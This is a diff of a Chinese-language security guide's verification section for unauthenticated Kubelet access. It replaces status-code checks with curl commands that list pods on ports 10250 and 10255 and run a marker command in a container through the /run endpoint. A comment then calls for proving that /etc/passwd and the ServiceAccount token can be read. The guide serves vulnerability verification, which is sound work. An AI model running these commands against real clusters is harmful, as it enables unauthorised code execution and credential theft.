@@ -91,24 +91,18 @@ curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
 ## 验证方法
 
 ```bash
-# 验证Kubelet未授权访问（读写端口）
-curl -sk -o /dev/null -w "%{http_code}" https://target:10250/pods
-# 返回200表示存在未授权访问
+# 未授权读取：响应体是 PodList JSON，items 元素带 metadata.name、metadata.namespace、spec.containers
+curl -sk https://target:10250/pods
+# 反例：401/403，或 {"kind":"Status","reason":"Unauthorized"} → 已启用认证
 
-# 验证只读端口
-curl -s -o /dev/null -w "%{http_code}" http://target:10255/pods
-# 返回200表示只读端口开放
+curl -s http://target:10255/pods
+# 只读端口判据同上，能解析出 PodList JSON 才算开放，404/403 不算
 
-# 验证命令执行
-curl -sk https://target:10250/pods | python3 -c "
-import sys,json
-pods=json.load(sys.stdin)
-for p in pods.get('items',[])[:1]:
-    ns=p['metadata']['namespace']
-    name=p['metadata']['name']
-    ct=p['spec']['containers'][0]['name']
-    print(f'Found pod: {ns}/{name}/{ct}')
-"
+# 命令执行：用上一条读到的 pod/namespace/container，打一条带本次标记的无损命令
+curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME -d "cmd=echo POC_TOKEN"
+# 判据：响应体出现 POC_TOKEN（原始输出，非 JSON 包装）
+# 反例：{"kind":"Status","reason":"NotFound"} 或 {"message":"exec: ... not found"}
+# 拿到回显后再证明可读 root:x:0:0（/etc/passwd）与 ServiceAccount token
 ```
 
 ## 指纹确认
